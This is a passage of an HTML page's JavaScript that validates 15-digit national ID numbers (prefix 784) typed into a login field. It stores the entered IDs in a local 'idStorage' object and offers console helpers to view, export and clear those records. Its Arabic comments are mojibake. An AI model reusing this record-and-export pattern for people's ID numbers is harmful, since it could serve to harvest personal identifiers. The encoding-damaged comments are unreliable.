                    // Ø¥Ø¶Ø§ÙØ© ÙÙˆØ§ØµÙ„ Ù„Ù„Ù‚Ø±Ø§Ø¡Ø©
                    if (value.length > 0) {
                        const formatted = value.replace(/(\d{3})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4');
                        e.target.setAttribute('data-formatted', formatted);
                    }
                }
            });
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ÙƒØªØ§Ø¨Ø©
            usernameInput.addEventListener('keyup', function() {
                const value = this.value.replace(/\D/g, '');
                
                if (value.length === 15) {
                    const validation = idStorage.validateID(value);
                    if (validation.isValid) {
                        this.style.borderColor = '#00ac75';
                        this.style.boxShadow = '0 0 0 3px rgba(0, 172, 117, 0.1)';
                    } else {
                        this.style.borderColor = '#ff4757';
                        this.style.boxShadow = '0 0 0 3px rgba(255, 71, 87, 0.1)';
                    }
                } else {
                    this.style.borderColor = '';
                    this.style.boxShadow = '';
                }
            });
            
            // Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù…Ø·ÙˆØ±ÙŠÙ†
            console.log('ğŸ”§ Ø£Ø¯ÙˆØ§Øª Ø§Ù„ØªØ·ÙˆÙŠØ± Ø§Ù„Ù…ØªØ§Ø­Ø©:');
            console.log('- idStorage.getRecords() - Ø¹Ø±Ø¶ Ø§Ù„Ø³Ø¬Ù„Ø§Øª');
            console.log('- idStorage.exportData() - ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
            console.log('- idStorage.clearRecords() - Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„Ø§Øª');
            console.log('- testSave() - Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø­ÙØ¸');
            
            // Ø²Ø± Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø³Ø±ÙŠØ¹
            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
                const testButton = document.createElement('button');
                testButton.innerHTML = '<i class="fas fa-vial"></i> Ø§Ø®ØªØ¨Ø§Ø±';
                testButton.style.cssText = `
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    padding: 8px 12px;
                    background: #607d8b;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 12px;
                    z-index: 1000;
                    opacity: 0.8;
                `;
                testButton.onclick = function() {
                    const testId = '784' + Math.floor(100000000000 + Math.random() * 900000000000).toString().substr(0, 12);
                    usernameInput.value = testId;
                    document.getElementById('rememberme').checked = true;
                    showMessage(`ØªÙ… Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ø®ØªØ¨Ø§Ø±: ${testId}`, 'info', 3000);
                };
                document.body.appendChild(testButton);
            }
        });

        // === Ø¯Ø§Ù„Ø© Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø­ÙØ¸ ===
        window.testSave = function() {
            const testId = '784199012345678';
            usernameInput.value = testId;
            
            // Ù…Ø­Ø§ÙƒØ§Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
            setTimeout(() => {
                loginForm.dispatchEvent(new Event('submit'));
            }, 500);
            
            console.log('ğŸ§ª Ø¬Ø§Ø±ÙŠ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø­ÙØ¸...');
        };

    </script>
</body>
</html>
